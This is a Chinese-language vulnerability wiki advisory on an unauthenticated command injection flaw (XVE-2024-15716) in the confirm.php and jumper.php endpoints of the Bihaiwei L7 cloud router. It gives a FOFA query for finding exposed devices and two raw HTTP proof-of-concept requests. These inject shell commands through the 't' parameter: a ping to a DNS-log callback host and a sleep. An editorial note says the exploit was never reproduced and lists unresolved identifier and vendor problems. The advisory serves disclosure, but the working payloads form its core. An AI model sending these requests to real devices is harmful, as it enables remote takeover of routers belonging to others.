---
source: "SourByte05/Vulnerability-Wiki-PoC"
id: "vw-abe786d3d677295260d3837b"
entity_id: "ve-abe786d3d677295260d3837b"
schema_version: "1"
cnvd_unverified: "XVE-2024-15716"
xve: "XVE-2024-15716"
title: "碧海威L7云路由无线运营版 confirm.phpjumper.php 命令注入漏洞(XVE-2024-15716)"
product: "碧海威L7云路由无线运营版"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "primary"
primary_identifiers: "XVE-2024-15716"
referenced_identifiers: ""
prerequisites: "无cookie请求，未给版本/鉴权"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%A2%A7%E6%B5%B7%E5%A8%81/%E7%A2%A7%E6%B5%B7%E5%A8%81L7%E4%BA%91%E8%B7%AF%E7%94%B1%E6%97%A0%E7%BA%BF%E8%BF%90%E8%90%A5%E7%89%88%20confirm.phpjumper.php%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%28XVE-2024-15716%29.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_status: "unknown"
---

# 碧海威L7云路由无线运营版 confirm.phpjumper.php 命令注入漏洞(XVE-2024-15716)

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：碧海威L7云路由无线运营版
- 本文讨论：XVE-2024-15716 confirm.php/jumper.php t注入
- 版本、权限与配置前提：无cookie请求，未给版本/鉴权
- 资料类型：双入口RCE预警；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- XVE编号误放cnvd；标题接口黏连
- 已知在野无来源；延迟与DNS输出仅截图，无基线/固定版本
- 与WIFISKY相同接口需核OEM，不能先合品牌
- 已落实的文本修订：编号保留原值并纠正命名空间字段。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 官方XVE映射、鉴权与WIFISKY组件关系待核验
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 漏洞描述

碧海威L7 confirm.php、jumper.php接口处存在RCE漏洞，恶意攻击者可能利用此漏洞执行恶意命令，获取服务器敏感信息，最终可能导致服务器失陷。

影响范围

碧海威科技-L7

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 中 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="碧海威科技-L7云路由"

POC/EXP1：

```http
GET /notice/confirm.php?t=;ping%204151.eyes.sh HTTP/1.1
Host: 127.0.0.1:1443
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


![image-20240627161948437](./.resource/碧海威L7云路由无线运营版confirm.phpjumper.php命令注入漏洞XVE-2024-15716/media/image-20240627161948437.png)


![image-20240627162123150](./.resource/碧海威L7云路由无线运营版confirm.phpjumper.php命令注入漏洞XVE-2024-15716/media/image-20240627162123150.png)


POC/EXP2：

```http
GET /notice/jumper.php?t=;sleep%209 HTTP/1.1
Host: 127.0.0.1:1443
Accept: application/json, text/javascript, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```


![image-20240627162233035](./.resource/碧海威L7云路由无线运营版confirm.phpjumper.php命令注入漏洞XVE-2024-15716/media/image-20240627162233035.png)


# 修复方案

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
